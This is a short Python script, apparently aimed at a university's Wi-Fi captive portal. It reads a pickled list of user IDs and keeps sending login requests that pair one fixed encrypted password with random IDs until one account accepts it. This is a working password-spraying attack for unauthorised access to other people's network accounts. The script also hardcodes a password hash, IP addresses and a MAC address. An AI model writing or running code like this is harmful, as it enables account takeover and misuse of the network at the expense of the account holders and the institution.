import requests
import re
import random
import pickle
import logging

logging.basicConfig()
logger = logging.getLogger('UESTC WIFI')
logger.setLevel(logging.DEBUG)


def get_user_ip_address():
    new_session = requests.session()
    response = new_session.get(url="http://123.123.123.123/")
    url = response.url
    # ips = re.findall(r'[0-9]+(?:\.[0-9]+){3}', url)
    ip = re.findall(r'userip=[0-9]+(?:\.[0-9]+){3}', url)[0].strip('userip=')
    return ip


def main():
    url = 'http://172.25.249.8/eportal/auth/jsonp/login'
    headers = {
        "Accept-Language": "ja,en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko)",
        "Accept-Encoding": "gzip, deflate",
    }
    ip = get_user_ip_address()
    params = {
        'jsonp': 'getJSONP.getJSONPbdc',
        'userId': None,
        'password': '419433c6c3d8057ac1ef5ef6817dfdd8f11def4536af193e1ed07536e8e9ee65285c6ff4d8de3251c0091518d1eb4dd7fcc20ee5300d292a0fb8bda678cad3e434041e8e854d15d3689bc51c84fb44f961e354409fa75deb2f3f1c263e8ab927cae0a4626031ddfc72f9a80a79a2cfa655c1754585659e293995d8d1f5466b49',
        'service': '',
        'queryString': 'version%3D52472d65506f7274616c20454e54455250524953455f342e3231287032295f4275696c643230313730383136%26userip%3D100.66.153.63%26wlanacname%3D%26nasip%3D171.88.130.251%26wlanparameter%3D8c-85-90-16-5d-87%26url%3Dhttp%3A%2F%2F123.123.123.123%2F%26userlocation%3Dethtrunk%2F3%3A291.3201',
        'operatorPwd': '',
        'operatorUserId': '',
        'validcode': ''
    }
    with open('data.pkl', 'rb') as f:
        user_list = pickle.load(f)


    while True:
        user = random.choice(user_list)
        user_list.remove(user)
        params['userId'] = str(user)
        response = requests.get(url, headers=headers, params=params)
        if 'success' in response.text:
            logger.critical("succeed at " + str(user))
            break
        else:
            pass
            logger.info("failed at" + str(user))


if __name__ == '__main__':
    main()
